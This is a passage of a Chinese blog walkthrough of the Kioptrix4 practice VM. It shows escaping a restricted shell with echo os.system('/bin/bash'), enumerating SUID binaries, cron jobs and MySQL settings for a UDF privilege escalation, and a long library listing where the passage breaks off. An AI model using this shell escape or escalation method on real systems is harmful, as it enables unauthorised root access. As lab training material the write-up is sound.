ADGAdsafdfwt4gadfga==</span><br><span class="hljs-string"></span><br><span class="hljs-string">== Welcome LigGoat Employee ==</span><br><span class="hljs-string">LigGoat Shell is in place so you  don\&#x27;</span>t screw up<br>Type <span class="hljs-string">&#x27;?&#x27;</span> or <span class="hljs-string">&#x27;help&#x27;</span> to get the list of allowed commands<br>robert:~$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>*** unknown <span class="hljs-built_in">command</span>: <span class="hljs-built_in">id</span><br>robert:~$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p>是受限的 shell 啊，那就先回到 www-data的用户里 ，简单的信息收集后再看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Kioptrix4:/home/john$ <span class="hljs-built_in">cat</span> .lhistory<br><span class="hljs-built_in">cat</span> .lhistory<br>?<br><span class="hljs-built_in">help</span><br><span class="hljs-built_in">echo</span> os.system(<span class="hljs-string">&#x27;/bin/bash&#x27;</span>)<br><span class="hljs-built_in">exit</span><br>su<br>sudo<br>?<br>scp<br><span class="hljs-built_in">touch</span> hello<br><span class="hljs-built_in">help</span><br><span class="hljs-built_in">ls</span> /root<br><span class="hljs-built_in">exit</span><br><span class="hljs-built_in">echo</span> os.system(<span class="hljs-string">&#x27;/bin/bash&#x27;</span>)<br><span class="hljs-built_in">exit</span><br>su robert<br><span class="hljs-built_in">exit</span><br><br></code></pre></td></tr></table></figure><p>发现了一个命令 <code>echo os.system(&#39;/bin/bash&#39;)</code>，感觉可以绕过受限的 shell，这次用 ssh 登录吧，交互性更好一点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Kioptrix4]<br>└─$ ssh john@192.1.1.135 -oHostKeyAlgorithms=ssh-rsa        <br>The authenticity of host <span class="hljs-string">&#x27;192.1.1.135 (192.1.1.135)&#x27;</span> can\<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">RSA key fingerprint is SHA256:3fqlLtTAindnY7CGwxoXJ9M2rQF6nn35SFMTVv56lww.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.1.1.135<span class="hljs-string">&#x27; (RSA) to the list of known hosts.</span><br><span class="hljs-string">john@192.1.1.135\&#x27;</span>s password: <br>Welcome to LigGoat Security Systems - We are Watching<br>== Welcome LigGoat Employee ==<br>LigGoat Shell is <span class="hljs-keyword">in</span> place so you  don\<span class="hljs-string">&#x27;t screw up</span><br><span class="hljs-string">Type &#x27;</span>?<span class="hljs-string">&#x27; or &#x27;</span><span class="hljs-built_in">help</span><span class="hljs-string">&#x27; to get the list of allowed commands</span><br><span class="hljs-string">john:~$ ?</span><br><span class="hljs-string">cd  clear  echo  exit  help  ll  lpath  ls</span><br><span class="hljs-string">john:~$ echo os.system(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">john@Kioptrix4:~$ whoami</span><br><span class="hljs-string">john</span><br></code></pre></td></tr></table></figure><p>继续信息收集，寻找提权突破点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">john@Kioptrix4:/$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> john: <br>Sorry, user john may not run sudo on Kioptrix4.<br><br><br>robert@Kioptrix4:/$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> robert: <br>Sorry, user robert may not run sudo on Kioptrix4.<br></code></pre></td></tr></table></figure><p>两个用户都没有特殊的权限，顺便看了眼 SUID</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">robert@Kioptrix4:~$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br> 98926   12 -rwsr-xr--   1 root     www-data    10276 Jun 18  2009 /usr/lib/apache2/suexec<br> 65689    8 -rwsr-xr-x   1 root     root         4588 Aug 22  2008 /usr/lib/eject/dmcrypt-get-device<br> 98543  172 -rwsr-xr-x   1 root     root       168340 May 14  2008 /usr/lib/openssh/ssh-keysign<br> 51653   12 -rwsr-xr-x   1 root     root         9624 Sep 12  2008 /usr/lib/pt_chown<br> 50863   24 -rwsr-xr-x   1 root     root        23952 Dec  8  2008 /usr/bin/chsh<br> 52342  112 -rwsr-xr-x   2 root     root       107936 Feb 16  2009 /usr/bin/sudo<br> 53268   16 -rwsr-xr-x   1 root     root        12296 Dec 10  2007 /usr/bin/traceroute6.iputils<br> 50694   20 -rwsr-xr-x   1 root     root        19144 Dec  8  2008 /usr/bin/newgrp<br> 52342  112 -rwsr-xr-x   2 root     root       107936 Feb 16  2009 /usr/bin/sudoedit<br> 50862   28 -rwsr-xr-x   1 root     root        28624 Dec  8  2008 /usr/bin/chfn<br> 53266   12 -rwsr-xr-x   1 root     root        11048 Dec 10  2007 /usr/bin/arping<br> 50865   40 -rwsr-xr-x   1 root     root        37360 Dec  8  2008 /usr/bin/gpasswd<br> 53495   48 -rwsr-xr-x   1 root     root        46084 Mar 31  2008 /usr/bin/mtr<br> 50866   32 -rwsr-xr-x   1 root     root        29104 Dec  8  2008 /usr/bin/passwd<br> 53056   40 -rwsr-sr-x   1 daemon   daemon      38464 Feb 20  2007 /usr/bin/at<br> 53554  268 -rwsr-xr--   1 root     dip        269256 Oct  4  2007 /usr/sbin/pppd<br> 52104   16 -rwsr-sr-x   1 libuuid  libuuid     12336 Mar 27  2008 /usr/sbin/uuidd<br> 81744    4 -rwsr-xr--   1 root     dhcp         2960 Apr  2  2008 /lib/dhcp3-client/call-dhclient-script<br> 40836   84 -rwsr-xr-x   1 root     root        81368 Sep 26  2008 /bin/mount<br> 40860   28 -rwsr-xr-x   1 root     root        26684 Dec 10  2007 /bin/ping6<br> 40896   20 -rwsr-xr--   1 root     fuse        20056 Feb 26  2008 /bin/fusermount<br> 40833   28 -rwsr-xr-x   1 root     root        25540 Dec  8  2008 /bin/su<br> 40859   32 -rwsr-xr-x   1 root     root        30856 Dec 10  2007 /bin/ping<br> 40837   68 -rwsr-xr-x   1 root     root        63584 Sep 26  2008 /bin/umount<br>148300   12 -rwsr-xr-x   1 root     root         9260 Mar  9  2009 /sbin/umount.cifs<br>148299   24 -rwsr-xr-x   1 root     root        23340 Mar  9  2009 /sbin/mount.cifs<br></code></pre></td></tr></table></figure><p>suexec 没见过，搜了一下，但是似乎没法用来提权，定时任务也看了一下，空空如也</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Kioptrix4:/home/john$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># m h dom mon dow user  command</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><p><code>ps aux</code> 和 <code>netstat ano</code>，发现 MySQL 是 root 进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">john@Kioptrix4:~$ ps aux | grep mysql<br>ps aux | grep mysql<br>root      5015  0.0  0.5 130348 21380 ?        Sl   Jul15   0:07 /usr/sbin/mysql<br><br></code></pre></td></tr></table></figure><p>还有一个细节，网站目录有两个 sqlmap 为了 os-shell 而写入的文件，属主是 root，或许可以尝试 UDF 提权，登录 MySQL 看看满不满足导入导出无限制的条件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Kioptrix4:/var/www$ mysql -uroot<br>mysql -uroot<br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection <span class="hljs-built_in">id</span> is 7639<br>Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)<br><br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the buffer.<br><br>mysql&gt; show global variables like <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br>show global variables like <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br>+------------------+-------+<br>| Variable_name    | Value |<br>+------------------+-------+<br>| secure_file_priv |       | <br>+------------------+-------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><p>应该是满足条件的，看看安装目录吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; <span class="hljs-keyword">select</span> @@basedir;<br><span class="hljs-keyword">select</span> @@basedir;<br>+-----------+<br>| @@basedir |<br>+-----------+<br>| /usr/     | <br>+-----------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt; show variables like <span class="hljs-string">&#x27;%plugin%&#x27;</span>;<br>show variables like <span class="hljs-string">&#x27;%plugin%&#x27;</span>;<br>Empty <span class="hljs-built_in">set</span> (0.00 sec)<br><br></code></pre></td></tr></table></figure><p>淦，这个情况没见过，根据以前学到的 UDF 提权，按理说首先看安装目录，然后在 <code>/lib/plugin</code> 目录中写入 udf 的动态链接库。而网上的教程里，插件目录是必备的一步……在这里卡了很久，因为这里的 lib 目录是 root 才可写，我没法创建文件，查了很多中文教程，都没有很好的解决办法。甚至于我去尝试了内核提权，因为这个靶机的版本比较低，应该是支持脏牛漏洞提权的，不过由于 gcc 被扣掉了，而且是 32 位系统，在找可执行的 exploit 时遇到了很多困难，没有利用成功。</p><h3 id="MySQL-UDF-提权"><a href="#MySQL-UDF-提权" class="headerlink" title="MySQL UDF 提权"></a>MySQL UDF 提权</h3><p>最后看 lib 下的文件的时候，意外看到了个 <code>lib_mysqludf_sys.so</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Kioptrix4:/usr/lib$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 19M<br>49005 drwxr-xr-x 43 root root  12K Feb  4  2012 .<br>48961 drwxr-xr-x 10 root root 4.0K Feb  4  2012 ..<br>51463 -rw-r--r--  1 root root 8.5K Dec 13  2007 GNU.Gettext.dll<br>98857 drwxr-xr-x  3 root root 4.0K Feb  4  2012 apache2<br>57837 drwxr-xr-x  3 root root 4.0K Feb  4  2012 apt<br>98856 drwxr-xr-x  2 root root 4.0K Jun 18  2009 cgi-bin<br>53145 -rwxr-xr-x  1 root root 1.7K Apr 11  2008 command-not-found<br>75725 drwxr-xr-x  3 root root 4.0K Feb  4  2012 cups<br>49867 drwxr-xr-x  3 root root 4.0K Feb  4  2012 dpkg<br>48995 -rwxr-xr-x  1 root root 7.3K Mar 27  2008 e2initrd_helper<br>65688 drwxr-xr-x  2 root root 4.0K Feb  4  2012 eject<br>91447 drwxr-xr-x  3 root root 4.0K Feb  4  2012 gcc<br>49948 drwxr-xr-x  2 root root  20K Feb  4  2012 gconv<br>65741 drwxr-xr-x  2 root root 4.0K Feb  4  2012 gnupg<br>98100 drwxr-xr-x  3 root root 4.0K Feb  4  2012 groff<br>75769 drwxr-xr-x  3 root root 4.0K Feb  4  2012 grub<br>65948 drwxr-xr-x  2 root root 4.0K Feb  4  2012 i486<br>50194 drwxr-xr-x  2 root root 4.0K Sep 12  2008 i486-linux-gnu<br>65951 drwxr-xr-x  2 root root 4.0K Feb  4  2012 i586<br>65954 drwxr-xr-x  3 root root 4.0K Feb  4  2012 i686<br>65350 drwxr-xr-x  3 root root 4.0K Feb  4  2012 initramfs-tools<br>65826 drwxr-xr-x  3 root root 4.0K Feb  4  2012 klibc<br>65866 drwxr-xr-x  3 root root 4.0K Feb  4  2012 krb5<br>52625 -rw-rw-rw-  1 root root  13K Feb  4  2012 lib_mysqludf_sys.so<br>53614 lrwxrwxrwx  1 root root   18 Feb  4  2012 libapr-1.so.0 -&gt; libapr-1.so.0.2.11<br>53613 -rw-r--r--  1 root root 144K Nov 23  2007 libapr-1.so.0.2.11<br>53618 lrwxrwxrwx  1 root root   22 Feb  4  2012 libaprutil-1.so.0 -&gt; libaprutil-1.so.0.2.11<br>53617 -rw-r--r--  1 root root 102K Jun  9  2009 libaprutil-1.so.0.2.11<br>51163 lrwxrwxrwx  1 root root   30 Feb  4  2012 libapt-inst-libc6.7-6.so.1.1 -&gt; libapt-inst-libc6.7-6.so.1.1.0<br>51153 -rw-r--r--  1 root root  73K Apr 17  2009 libapt-inst-libc6.7-6.so.1.1.0<br>51313 lrwxrwxrwx  1 root root   29 Feb  4  2012 libapt-pkg-libc6.7-6.so.4.6 -&gt; libapt-pkg-libc6.7-6.so.4.6.0<br>51170 -rw-r--r--  1 root root 827K Apr 17  2009 libapt-pkg-libc6.7-6.so.4.6.0<br>51470 lrwxrwxrwx  1 root root   20 Feb  4  2012 libasprintf.so.0 -&gt; libasprintf.so.0.0.0<br>51464 -rw-r--r--  1 root root 5.6K Dec 13  2007 libasprintf.so.0.0.0<br>53086 lrwxrwxrwx  1 root root   18 Feb  4  2012 libbind9.so.30 -&gt; libbind9.so.30.1.0<br>53085 -rw-r--r--  1 root root  36K Jan  7  2009 libbind9.so.30.1.0<br>53670 lrwxrwxrwx  1 root root   24 Feb  4  2012 libck-connector.so.0 -&gt; libck-connector.so.0.0.0<br>53669 -rw-r--r--  1 root root 9.0K Mar 21  2008 libck-connector.so.0.0.0<br>52098 -rw-r--r--  1 root root 1.3M Jun 11  2009 libcrypto.so.0.9.8<br>53671 -rw-r--r--  1 root root 202K Jun  1  2009 libcups.so.2<br>51410 lrwxrwxrwx  1 root root   19 Feb  4  2012 libcurl-gnutls.so.3 -&gt; libcurl-gnutls.so.4<br>51409 lrwxrwxrwx  1 root root   23 Feb  4  2012 libcurl-gnutls.so.4 -&gt; libcurl-gnutls.so.4.0.1<br>51407 -rw-r--r--  1 root root 225K Mar  2  2009 libcurl-gnutls.so.4.0.1<br>51412 lrwxrwxrwx  1 root root   19 Feb  4  2012 libcwidget.so.3 -&gt; libcwidget.so.3.0.0<br>51411 -rw-r--r--  1 root root 968K Feb  8  2008 libcwidget.so.3.0.0<br>49094 -rw-r--r--  1 root root 1.2M Mar 10  2008 libdb-4.6.so<br>51416 lrwxrwxrwx  1 root root   18 Feb  4  2012 libdbus-1.so.3 -&gt; libdbus-1.so.3.4.0<br>51415 -rw-r--r--  1 root root 210K Oct 14  2008 libdbus-1.so.3.4.0<br>51543 lrwxrwxrwx  1 root root   16 Feb  4  2012 libdes425.so.3 -&gt; libdes425.so.3.0<br>51536 -rw-r--r--  1 root root 9.9K Apr  7  2009 libdes425.so.3.0<br>53080 lrwxrwxrwx  1 root root   16 Feb  4  2012 libdns.so.35 -&gt; libdns.so.35.0.1<br>53079 -rw-r--r--  1 root root 1.2M Jan  7  2009 libdns.so.35.0.1<br>53275 lrwxrwxrwx  1 root root   14 Feb  4  2012 libedit.so.2 -&gt; libedit.so.2.9<br>53274 -rw-r--r--  1 root root 107K Oct 24  2007 libedit.so.2.9<br>53277 lrwxrwxrwx  1 root root   15 Feb  4  2012 libelf.so.0 -&gt; libelf.so.0.8.6<br>53278 lrwxrwxrwx  1 root root   15 Feb  4  2012 libelf.so.0.8 -&gt; libelf.so.0.8.6<br>53276 -rw-r--r--  1 root root  75K Oct  2  2007 libelf.so.0.8.6<br>53000 lrwxrwxrwx  1 root root   17 Feb  4  2012 libexpat.so.1 -&gt; libexpat.so.1.5.2<br>52999 -rw-r--r--  1 root root 129K Dec  5  2007 libexpat.so.1.5.2<br>49825 lrwxrwxrwx  1 root root   14 Feb  4  2012 libform.so.5 -&gt; libform.so.5.6<br>49813 -rw-r--r--  1 root root  46K Feb 23  2008 libform.so.5.6<br>52086 lrwxrwxrwx  1 root root   15 Feb  4  2012 libformw.so.5 -&gt; libformw.so.5.6<br>52083 -rw-r--r--  1 root root  52K Feb 23  2008 libformw.so.5.6<br>51447 lrwxrwxrwx  1 root root   19 Feb  4  2012 libfribidi.so.0 -&gt; libfribidi.so.0.0.0<br>51445 -rw-r--r--  1 root root  53K Feb  1  2008 libfribidi.so.0.0.0<br>53281 lrwxrwxrwx  1 root root   14 Feb  4  2012 libgc.so.1 -&gt; libgc.so.1.0.2<br>53279 -rw-r--r--  1 root root 144K Dec  5  2007 libgc.so.1.0.2<br>53282 lrwxrwxrwx  1 root root   17 Feb  4  2012 libgccpp.so.1 -&gt; libgccpp.so.1.0.2<br>53280 -rw-r--r--  1 root root 3.4K Dec  5  2007 libgccpp.so.1.0.2<br>52642 lrwxrwxrwx  1 root root   16 Feb  4  2012 libgdbm.so.3 -&gt; libgdbm.so.3.0.0<br>52640 -rw-r--r--  1 root root  19K Jun 15  2006 libgdbm.so.3.0.0<br>52643 lrwxrwxrwx  1 root root   23 Feb  4  2012 libgdbm_compat.so.3 -&gt; libgdbm_compat.so.3.0.0<br>52641 -rw-r--r--  1 root root 6.1K Jun 15  2006 libgdbm_compat.so.3.0.0<br>51490 lrwxrwxrwx  1 root root   25 Feb  4  2012 libgnutls-extra.so.13 -&gt; libgnutls-extra.so.13.9.1<br>51487 -rw-r--r--  1 root root  52K Feb 20  2009 libgnutls-extra.so.13.9.1<br>51491 lrwxrwxrwx  1 root root   27 Feb  4  2012 libgnutls-openssl.so.13 -&gt; libgnutls-openssl.so.13.9.1<br>51488 -rw-r--r--  1 root root  41K Feb 20  2009 libgnutls-openssl.so.13.9.1<br>51489 lrwxrwxrwx  1 root root   19 Feb  4  2012 libgnutls.so.13 -&gt; libgnutls.so.13.9.1<br>51486 -rw-r--r--  1 root root 474K Feb 20  2009 libgnutls.so.13.9.1<br>53284 lrwxrwxrwx  1 root root   16 Feb  4  2012 libgpm.so.1 -&gt; libgpm.so.1.19.6<br>53283 -rw-r--r--  1 root root  19K Feb  2  2008 libgpm.so.1.19.6<br>51544 lrwxrwxrwx  1 root root   21 Feb  4  2012 libgssapi_krb5.so.2 -&gt; libgssapi_krb5.so.2.2<br>51537 -rw-r--r--  1 root root 164K Apr  7  2009 libgssapi_krb5.so.2.2<br>51565 -rw-r--r--  1 root root  801 Oct 24  2007 libidn.la<br>51566 lrwxrwxrwx  1 root root   17 Feb  4  2012 libidn.so.11 -&gt; libidn.so.11.5.30<br>51564 -rw-r--r--  1 root root 193K Oct 24  2007 libidn.so.11.5.30<br>53078 lrwxrwxrwx  1 root root   16 Feb  4  2012 libisc.so.35 -&gt; libisc.so.35.0.0<br>53077 -rw-r--r--  1 root root 272K Jan  7  2009 libisc.so.35.0.0<br>53082 lrwxrwxrwx  1 root root   18 Feb  4  2012 libisccc.so.30 -&gt; libisccc.so.30.0.1<br>53081 -rw-r--r--  1 root root  26K Jan  7  2009 libisccc.so.30.0.1<br>53084 lrwxrwxrwx  1 root root   19 Feb  4  2012 libisccfg.so.30 -&gt; libisccfg.so.30.0.4<br>53083 -rw-r--r--  1 root root  70K Jan  7  2009 libisccfg.so.30.0.4<br>51545 lrwxrwxrwx  1 root root   18 Feb  4  2012 libk5crypto.so.3 -&gt; libk5crypto.so.3.1<br>51538 -rw-r--r--  1 root root 140K Apr  7  2009 libk5crypto.so.3.1<br>51546 lrwxrwxrwx  1 root root   14 Feb  4  2012 libkrb4.so.2 -&gt; libkrb4.so.2.0<br>51539 -rw-r--r--  1 root root  89K Apr  7  2009 libkrb4.so.2.0<br>51547 lrwxrwxrwx  1 root root   14 Feb  4  2012 libkrb5.so.3 -&gt; libkrb5.so.3.3<br>51540 -rw-r--r--  1 root root 560K Apr  7  2009 libkrb5.so.3.3<br>51548 lrwxrwxrwx  1 root root   21 Feb  4  2012 libkrb5support.so.0 -&gt; libkrb5support.so.0.1<br>51541 -rw-r--r--  1 root root  27K Apr  7  2009 libkrb5support.so.0.1<br>52095 lrwxrwxrwx  1 root root   20 Feb  4  2012 liblber-2.4.so.2 -&gt; liblber-2.4.so.2.0.5<br>52092 -rw-r--r--  1 root root  48K Mar 31  2009 liblber-2.4.so.2.0.5<br>52097 lrwxrwxrwx  1 root root   18 Feb  4  2012 libldap-2.4.so.2 -&gt; libldap_r-2.4.so.2<br>52096 lrwxrwxrwx  1 root root   22 Feb  4  2012 libldap_r-2.4.so.2 -&gt; libldap_r-2.4.so.2.0.5<br>52093 -rw-r--r--  1 root root 246K Mar 31  2009 libldap_r-2.4.so.2.0.5<br>53088 lrwxrwxrwx  1 root root   18 Feb  4  2012 liblwres.so.30 -&gt; liblwres.so.30.0.5<br>53087 -rw-r--r--  1 root root  64K Jan  7  2009 liblwres.so.30.0.5<br>51563 lrwxrwxrwx  1 root root   16 Feb  4  2012 liblzo2.so.2 -&gt; liblzo2.so.2.0.0<br>51562 -rw-r--r--  1 root root 123K Jun 16  2007 liblzo2.so.2.0.0<br>53209 lrwxrwxrwx  1 root root   17 Feb  4  2012 libmagic.so.1 -&gt; libmagic.so.1.0.0<br>53204 -rw-r--r--  1 root root  68K Jun  5  2009 libmagic.so.1.0.0<br>49828 lrwxrwxrwx  1 root root   14 Feb  4  2012 libmenu.so.5 -&gt; libmenu.so.5.6<br>49816 -rw-r--r--  1 root root  24K Feb 23  2008 libmenu.so.5.6<br>52087 lrwxrwxrwx  1 root root   15 Feb  4  2012 libmenuw.so.5 -&gt; libmenuw.so.5.6<br>52084 -rw-r--r--  1 root root  24K Feb 23  2008 libmenuw.so.5.6<br>52764 lrwxrwxrwx  1 root root   24 Feb  4  2012 libmysqlclient.so.15 -&gt; libmysqlclient.so.15.0.0<br>52762 -rw-r--r--  1 root root 1.9M Nov 14  2008 libmysqlclient.so.15.0.0<br>52765 lrwxrwxrwx  1 root root   26 Feb  4  2012 libmysqlclient_r.so.15 -&gt; libmysqlclient_r.so.15.0.0<br>52763 -rw-r--r--  1 root root 1.9M Nov 